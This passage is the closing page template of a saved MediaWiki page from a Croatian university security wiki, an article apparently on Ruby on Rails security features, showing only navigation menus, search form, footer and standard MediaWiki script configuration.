+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Sigurnosne_zna%C4%8Dajke_Ruby_on_Rails_web_aplikacija&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Sigurnosne_zna%C4%8Dajke_Ruby_on_Rails_web_aplikacija&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Sigurnosne_zna%C4%8Dajke_Ruby_on_Rails_web_aplikacija" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Sigurnosne_zna%C4%8Dajke_Ruby_on_Rails_web_aplikacija" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Sigurnosne_zna%C4%8Dajke_Ruby_on_Rails_web_aplikacija&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Sigurnosne_zna%C4%8Dajke_Ruby_on_Rails_web_aplikacija&amp;oldid=37976" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 17:03, 22. siječnja 2016.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 2.023 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Sigurnosne_značajke_Ruby_on_Rails_web_aplikacija", "wgTitle": "Sigurnosne značajke Ruby on Rails web aplikacija", "wgAction": "view", "wgArticleId": 8675, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 37976, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.628 secs. -->			</body>
+</html>
